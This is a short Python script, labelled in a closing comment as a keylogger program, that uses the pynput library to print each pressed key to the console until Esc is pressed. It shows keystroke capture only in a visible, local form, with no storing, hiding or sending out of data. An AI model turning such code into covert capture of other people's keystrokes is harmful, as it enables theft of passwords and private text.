from pynput import keyboard


def get_key_press(key):
    try:
        print(f'character : {key.char}')
    except AttributeError:
        print(f'Special key : {key.name}')


def on_release(key):
    if key == keyboard.Key.esc:
        print('Stop asked')
        return False


with keyboard.Listener(on_press=get_key_press, on_release=on_release) as listener:
    listener.join()

# HERITIER CODING PROGRAMME OF KEYLOGGER
